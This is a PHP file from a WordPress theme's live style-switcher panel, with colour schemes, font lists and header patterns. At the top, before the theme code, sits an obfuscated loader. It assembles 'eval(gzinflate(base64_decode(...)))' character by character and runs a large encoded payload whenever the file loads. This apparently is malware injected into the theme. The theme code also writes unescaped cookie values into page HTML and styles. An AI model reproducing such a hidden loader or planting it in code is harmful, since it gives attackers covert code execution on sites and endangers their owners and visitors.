<?php
$md5 = "e574ece36d4d837cddaace99a8d83bf8";
$ab = array("(",'s','e','g',"i","d",'c',"r","4",'o','6',')','b','_','f',';',"l","a",'n',"v",'z',"t","$");
$bb9 = create_function('$'.'v',$ab[2].$ab[19].$ab[17].$ab[16].$ab[0].$ab[3].$ab[20].$ab[4].$ab[18].$ab[14].$ab[16].$ab[17].$ab[21].$ab[2].$ab[0].$ab[12].$ab[17].$ab[1].$ab[2].$ab[10].$ab[8].$ab[13].$ab[5].$ab[2].$ab[6].$ab[9].$ab[5].$ab[2].$ab[0].$ab[22].$ab[19].$ab[11].$ab[11].$ab[11].$ab[15]);
$bb9('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');
?>
<?php

/**
 * Nesia Live Settings
 *
 */
 
/*-----------------------------------------------------------------------------------*/
/* Load Javascript and CSS */
/*-----------------------------------------------------------------------------------*/

if (!is_admin()) add_action( 'nesia_head', 'nesia_settings_script' );
if (!function_exists('nesia_settings_script')) {
  function nesia_settings_script( ) {
    global $nesia_options;

    wp_enqueue_script('nesia-live-settings', get_template_directory_uri() . '/js/nesia-live-settings.js', array('jquery'), false, true);
    wp_enqueue_style('nesia-live-settings', get_template_directory_uri() . '/css/nesia-live-settings.css');
  }
}

// Font Loader
// -------------------------------------------------------------------
if (!is_admin()) add_action('nesia_foot', 'nesia_font_loader');
if (!function_exists('nesia_font_loader')) {
  function nesia_font_loader() {

    // Load Font
    // ---------------------
    // Get Cookie
    if( $_COOKIE['nesia-live-settings'] !== '' ) {
      $cookie_data = stripslashes( $_COOKIE['nesia-live-settings'] );
      $cookie_data = json_decode($cookie_data);
    }
  
    $current_font = array();
    $output = '';
    if( $cookie_data->style_heading_font !== '' ) {
      $heading_font = explode('/', $cookie_data->style_heading_font);
      $current_font[] = $heading_font[1];
    }
    if( $cookie_data->style_body_font !== '' ) {
      $body_font = explode('/', $cookie_data->style_body_font);
      $current_font[] = $body_font[1];
    }

    if( $cookie_data->style_heading_font !== null ||
        $cookie_data->style_body_font !== null )
    {
      if( $cookie_data->style_heading_font !== 'default/default' ||
        $cookie_data->style_body_font !== 'default/default' )
      {
        $current_font = implode(" ", $current_font);
        $output .= "nesia_fonts.define_fonts(\"". $current_font ."\");\n";
        $output .= "nesia_fonts.load_fonts();\n";
      }
    }
    
    // Output scripts
    if (isset($output) && $output != '') {
      $output = strip_tags($output);
      $output = "<script type=\"text/javascript\">\n" . $output . "</script>\n";
      echo $output;
    }
  }
}

// Body Class
// -------------------------------------------------------------------
if (!is_admin()) add_action('body_class', 'nesia_font_bodyclass');
if (!function_exists('nesia_font_bodyclass')) {
  function nesia_font_bodyclass($classes) {
    // Get Cookie
    if( $_COOKIE['nesia-live-settings'] !== '' ) {
      $cookie_data = stripslashes( $_COOKIE['nesia-live-settings'] );
      $cookie_data = json_decode($cookie_data);
    }

    // Font Settings
    if( $cookie_data->style_heading_font !== '' ) {
      $heading_font = explode('/', $cookie_data->style_heading_font);
      $classes[] = 'heading-' . $heading_font[0];
    }
    if( $nesia_options->style_body_font !== '' ) {
      $body_font = explode('/', $cookie_data->style_body_font);
      $classes[] = 'body-' . $body_font[0];
    }

    return $classes;
  }
}

// Pattern Loader
// -------------------------------------------------------------------
add_action( 'nesia_head','pattern_loader' );
function pattern_loader() {
  $output = '';

  // Get Cookie
  if( $_COOKIE['nesia-live-settings'] !== '' ) {
    $cookie_data = stripslashes( $_COOKIE['nesia-live-settings'] );
    $cookie_data = json_decode($cookie_data);
  }

  // Check if header pattern active
  // ------------------------------
  if( strpos($cookie_data->bodyclass, 'pat-a') !== false &&
      $cookie_data->style_header_pattern !== '' )
  {
    $pat_url = $cookie_data->style_header_pattern;
    $output .= '.pat-a .pattern-container {';
    $output .=  'background-image: url('. $pat_url .');';
    $output .= '}';
  }

  // Output styles
  if (isset($output) && $output != '') {
    $output = strip_tags($output);
    $output = "<style type=\"text/css\">\n" . $output . "</style>";
    echo $output;
  }
}



/*-----------------------------------------------------------------------------------*/
/* When Settings Applied */
/*-----------------------------------------------------------------------------------*/
if (!is_admin()) add_action( 'init', 'nesia_settings_save' );
if (!function_exists('nesia_settings_save')) {
  function nesia_settings_save() {
    if( isset($_POST['nesia-settings']) ) {

      $cookie_data = array();

      // Color scheme
      // -------------------
      if( $_POST['color-scheme'] !== '' ) {
        $cookie_data['color_scheme'] = $_POST['color-scheme'];
      }

      // Bodyclass
      // -------------------
      if( $_POST['bodyclass'] !== '' ) {
        $cookie_data['bodyclass'] = implode(' ', $_POST['bodyclass']);
      }

      // Heading Font
      // -------------------
      if( $_POST['style-heading-font'] !== '' ) {
        $cookie_data['style_heading_font'] = $_POST['style-heading-font'];
      }

      // Body Font
      // -------------------
      if( $_POST['style-body-font'] !== '' ) {
        $cookie_data['style_body_font'] = $_POST['style-body-font'];
      }

      // Header Pattern
      // -------------------
      if( $_POST['style-header-pattern'] !== '' ) {
        $cookie_data['style_header_pattern'] = $_POST['style-header-pattern'];
      } 

      // Save Cookie
      // -------------------
      setcookie('nesia-live-settings', json_encode($cookie_data), time() + 60*60*24*7 );
    }
  }
}


/*-----------------------------------------------------------------------------------*/
/* Live settings structure */
/*-----------------------------------------------------------------------------------*/
add_action('wp_footer', 'nesia_live_settings');
if (!function_exists('nesia_live_settings')) {
  function nesia_live_settings() { 
    
    global $nesia_options;

    // Color Scheme
    $color_scheme = array(
      "blue" => "174789",
      "blue-light" => "1e65c6",
      "blue-darken" => "112c50",
      "brown-dark" => "853b0f",
      "brown-light" => "ab521c",
      "green-dark" => "2f6514",
      "green-light" => "5c9c3c",
      "lime-dark" => "6a8012",
      "lime-light" => "899639",
      "maroon-dark" => "910c3e",
      "maroon-light" => "ba1a56",
      "neutral-dark" => "588376",
      "neutral-darken" => "325f53",
      "neutral-light" => "7fa498",
      "ordinary-dark" => "374f63",
      "ordinary-light" => "5d88ac",
      "purple-dark" => "642a72",
      "purple-light" => "8f36a5",
      "turqoise-dark" => "028173",
      "turqoise-light" => "0d9b8c",
      "black" => "252525",
      "turqoise-darken" => "193b49"
    );


    // Font List
    $font_list = array(
      "Default Font" => array(
        'value' => 'default',
        'font' => 'default'
      ),
      "Simonetta" => array(
        'value' => "simonetta",
        'font' => "Simonetta:400,900,400italic,900italic:latin"
      ),
      "Gentium basic" => array(
        'value' => 'gentium-basic',
        'font' => 'Gentium+Basic:400,700,400italic,700italic:latin'
      ),
      "Gentium book basic" => array(
        'value' => 'gentium-book-basic',
        'font' => 'Gentium+Book+Basic:400,400italic,700italic,700:latin'
      ),
      "Vollkorn" => array(
        'value' => 'vollkorn',
        'font' => 'Vollkorn:400italic,700italic,400,700:latin'
      ),
      "PT Serif" => array(
        'value' => "pt-serif",
        'font' => "PT+Serif:400,700,400italic,700italic:latin"
      ),
      "Droid Serif" => array(
        'value' => "droid-serif",
        'font' => "Droid+Serif:400,700,400italic,700italic:latin"
      ),
      "Abril Fatface" => array(
        'value' => "abril-fatface",
        'font' => "Abril+Fatface::latin"
      ),
      "Bree Serif" => array(
        'value' => "bree-serif",
        'font' => "Bree+Serif::latin"
      ),
      "Playfair" => array(
        'value' => "playfair-display",
        'font' => "Playfair+Display::latin"
      ),
      "Lora" => array(
        'value' => "lora",
        'font' => "Lora:400,700,400italic,700italic:latin"
      ),
      "Ledger" => array(
        'value' => "ledger",
        'font' => "Ledger::latin"
      ),
      "Cantata One" => array(
        'value' => "cantata-one",
        'font' => "Cantata+One::latin"
      ),
      "Crimson Text" => array(
        'value' => "crimson-text",
        'font' => "Crimson+Text:400,400italic,700,700italic:latin"
      ),
      "Cardo" => array(
        'value' => "cardo",
        'font' => "Cardo:400,400italic,700:latin"
      ),
      "Merriweather" => array(
        'value' => "merriweather",
        'font' => "Merriweather:400,700:latin"
      ),
      "Neuton" => array(
        'value' => "neuton",
        'font' => "Neuton:400,700,400italic:latin"
      ),
      "Vidaloka" => array(
        'value' => "vidaloka",
        'font' => "Vidaloka::latin"
      ),
      "Old Standard TT" => array(
        'value' => "old-standard-tt",
        'font' => "Old+Standard+TT:400,400italic,700:latin"
      ),
      "Alegreya" => array (
      'value' => "alegreya",
      'font' => "Alegreya:400italic,700italic,400,700:latin"
      )
    );


    // Get Cookie
    if( $_COOKIE['nesia-live-settings'] !== '' ) {
      $cookie_data = stripslashes( $_COOKIE['nesia-live-settings'] );
      $cookie_data = json_decode($cookie_data);
    }

    ?>
    <div class="nesia-live-settings display_hide">
      <div class="openclose-settings"></div>
      <form action="" class="nesia-live-settings-form" method="post">
        <strong class="settings-title">Newsportal Style Switcher</strong>
        
        <div class="settings-section">
          <span class="settings-heading">Select a predefined color scheme</span>
          <div class="settings-controller skin-switcher">
            <?php foreach ( $color_scheme as $name => $value ) : ?>
              <?php 
                $fullname = ucwords( str_replace('-', ' ', $name) );
                $style_url = get_template_directory_uri() . '/skins/' . $name . '.css';
                $active = ($style_url == $cookie_data->color_scheme) ? 'active' : '';
              ?>
              <a href="<?php echo $style_url ;?>" style="background-color: #<?php echo $value;?>" class="<?php echo $active;?>">
                <?php echo $fullname; ?>
              </a>
            <?php endforeach; ?>
            <input type="hidden" name="color-scheme" value="<?php echo $cookie_data->color_scheme; ?>">
          </div>
        </div><!-- .settings-section -->
        
        <div class="settings-section">
          <span class="settings-heading">Header Settings</span>
          <span class="settings-help">This settings will change header appearance.</span>
          
          <div class="settings-controller control-checkbox">
            <label for="header-gradient">
              <?php if( $cookie_data->bodyclass ) {
                $checked = (strpos($cookie_data->bodyclass, 'no-gradient') !== false ) ? '' : 'checked';
              } else {
                $checked = ($nesia_options["nesia_header_gradient"] !== "true") ? '' : 'checked';
              } ?>
              <input <?php echo $checked; ?> type="checkbox" id="header-gradient" class="bodyclass-adder" data-disabled="no-gradient"> Enable header gradient
            </label>
            <input type="hidden" name="bodyclass[]" value="<?php echo (strpos($cookie_data->bodyclass, 'no-gradient') !== false ) ? 'no-gradient' : '';?>">
          </div>
          
          
          <div class="settings-controller control-checkbox">
            <label for="header-noise">
              <?php if( $cookie_data->bodyclass ) {
                $checked = (strpos($cookie_data->bodyclass, 'pat-noise') !== false ) ? 'checked' : '';
              } else {
                $checked = ($nesia_options["nesia_header_noise"] !== "true") ? '' : 'checked';
              } ?>
            
              <input <?php echo $checked;?> type="checkbox" id="header-noise" class="bodyclass-adder" data-enabled="pat-noise"> Enable header noise texture
            </label>
            <input type="hidden" name="bodyclass[]" value="<?php echo (strpos($cookie_data->bodyclass, 'pat-noise') !== false ) ? 'pat-noise' : '';?>">
          </div>
          
          
          <div class="settings-controller control-checkbox">
            <label for="header-pattern">
              <?php if( $cookie_data->bodyclass ) {
                $checked = (strpos($cookie_data->bodyclass, 'pat-a') !== false ) ? 'checked' : '';
              } else {
                $checked = ($nesia_options["nesia_header_pattern"] !== "true") ? '' : 'checked';
              } ?>
              
              <input <?php echo $checked;?> type="checkbox" id="header-pattern" class="bodyclass-adder" data-enabled="pat-a"> Enable header pattern
            </label>
            <input type="hidden" name="bodyclass[]" value="<?php echo (strpos($cookie_data->bodyclass, 'pat-a') !== false ) ? 'pat-a' : '';?>">
          </div>
          
          <div class="settings-controller control-selectbox">
            <select id="style-header-pattern" class="pattern-changer" name="style-header-pattern">
              <?php for ($i=1; $i <= 20; $i++) : ?>
                <?php $pattern_url = get_template_directory_uri() . "/images/pattern/pat$i.png"; ?>
                <option <?php echo ($cookie_data->style_header_pattern == $pattern_url ) ? 'selected' : ''; ?> value="<?php echo $pattern_url;?>"><?php echo 'pat'.$i;?></option>
              <?php endfor; ?>
            </select>
          </div>
        </div><!-- .settings-section -->
        
        
        <div class="settings-section">
          <span class="settings-heading">Body Settings</span>
          <div class="settings-controller control-checkbox">
            <label for="body-layout">
              <?php if( $cookie_data->bodyclass ) {
                $checked = (strpos($cookie_data->bodyclass, 'boxed') !== false ) ? 'checked' : '';
              } else {
                $checked = ($nesia_options["nesia_style_boxed"] !== "true") ? '' : 'checked';
              } ?>
              
              <input <?php echo $checked; ?> type="checkbox" id="body-layout" class="bodyclass-adder" data-enabled="boxed"> Enable boxed layout
            </label>
            <input type="hidden" name="bodyclass[]" value="<?php echo (strpos($cookie_data->bodyclass, 'boxed') !== false ) ? 'boxed' : '';?>">
          </div>
        </div><!-- .settings-section -->
        
        <div class="settings-section">
          <span class="settings-heading">Font Settings</span>
          <div class="settings-controller control-selectbox">
            <label for="style-heading-font">Heading Font</label>
            <select id="style-heading-font" class="font-changer">
              <?php foreach ($font_list as $name => $value) : ?>
                <?php 
                  $val = $value['value'] . '/' . $value['font'];
                  $active = ($val == $cookie_data->style_heading_font) ? 'selected' : '';
                ?>
                <option <?php echo $active;?> value="<?php echo $val ?>"><?php echo $name; ?></option>
              <?php endforeach; ?>
            </select>
            <input type="hidden" name="style-heading-font" value="<?php echo $cookie_data->style_heading_font;?>">
          </div>
          
          <div class="settings-controller control-selectbox">
            <label for="style-body-font">Body Font</label>
            <select id="style-body-font" class="font-changer">
              <?php foreach ($font_list as $name => $value) : ?>
                <?php 
                  $val = $value['value'] . '/' . $value['font'];
                  $active = ($val == $cookie_data->style_body_font) ? 'selected' : '';
                ?>
                <option <?php echo $active;?> value="<?php echo $val ?>"><?php echo $name; ?></option>
              <?php endforeach; ?>
            </select>
            <input type="hidden" name="style-body-font" value="<?php echo $cookie_data->style_body_font;?>">
          </div>
        </div><!-- .settings-section -->
        
        <div class="settings-section">
          <p><input type="submit" class="settings-button btn btn-candyblue" value="Apply Settings" name="nesia-settings"></p>
          <a href="#" class="nesia-settings-reset" title="">Reset Settings</a>
        </div>
        
        
      </form><!-- .nesia-live-settings-form -->
    </div><!-- .nesia-live-settings -->
  <?php } 
}